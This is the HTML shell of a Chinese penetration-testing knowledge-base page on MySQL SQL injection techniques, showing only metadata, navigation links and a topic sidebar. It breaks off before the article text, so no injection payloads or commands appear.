<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">各种注入手法 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="各种注入手法 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前情提要"><meta data-rh="true" property="og:description" content="前情提要"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"WEB漏洞","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/"},{"@type":"ListItem","position":3,"name":"SQL注入","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/"},{"@type":"ListItem","position":4,"name":"MySQL","item":"https://blog.gm7.org/docs/category/mysql"},{"@type":"ListItem","position":5,"name":"各种注入手法","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.f7944275.css">
<script src="/assets/js/runtime~main.7a2f1031.js" defer="defer"></script>
<script src="/assets/js/main.d14e79f0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="折叠侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/">SQL注入</a><button aria-label="折叠侧边栏分类 &#x27;SQL注入&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/注入点检测/">注入点检测</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/数据库识别/">数据库识别</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/mysql">MySQL</a><button aria-label="折叠侧边栏分类 &#x27;MySQL&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/常用符号:函数:语句归类">常用符号:函数:语句归类</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/各种注入手法">各种注入手法</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/绕过技巧">绕过技巧</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/innodb存储引擎">innodb存储引擎</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-5 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/UDF提权">UDF提权</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/mssql">MSSQL</a><button aria-label="展开侧边栏分类 &#x27;MSSQL&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/oracle">Oracle</a><button aria-label="展开侧边栏分类 &#x27;Oracle&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/PostgreSQL/">PostgreSQL</a><button aria-label="展开侧边栏分类 &#x27;PostgreSQL&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/Access/">Access</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/万能密码/">万能密码</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-4 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/工具">工具</a><button aria-label="展开侧边栏分类 &#x27;工具&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSS/">XSS</a><button aria-label="展开侧边栏分类 &#x27;XSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/csrf">CSRF</a><button aria-label="展开侧边栏分类 &#x27;CSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSRF/">SSRF</a><button aria-label="展开侧边栏分类 &#x27;SSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/未授权访问">未授权访问</a><button aria-label="展开侧边栏分类 &#x27;未授权访问&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/条件竞争/">条件竞争</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意文件下载:读取/">任意文件下载/读取</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件上传/">文件上传</a><button aria-label="展开侧边栏分类 &#x27;文件上传&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/">文件包含漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/LDAP注入/">LDAP注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/命令执行/">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/代码注入/">代码注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SAML测试/">SAML测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/JSONP数据劫持/">JSONP数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CORS跨域数据劫持/">CORS跨域数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CSV注入/">CSV注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSSI/">XSSI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSLT/">XSLT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XS-Leaks/">XS-Leaks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSTI注入/">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/GraphQL测试/">GraphQL安全测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/子域名接管/">子域名接管</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/列目录漏洞/">列目录漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XPATH注入/">XPATH注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/越权漏洞/">越权漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/不安全的反序列化/">不安全的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意URL跳转/">任意URL跳转</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/信息泄漏/">信息泄漏漏洞</a><button aria-label="展开侧边栏分类 &#x27;信息泄漏漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SMTP注入/">SMTP注入</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/逻辑漏洞/">逻辑漏洞</a><button aria-label="展开侧边栏分类 &#x27;逻辑漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CRLF注入/">CRLF注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/web缓存投毒/">WEB缓存投毒</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" 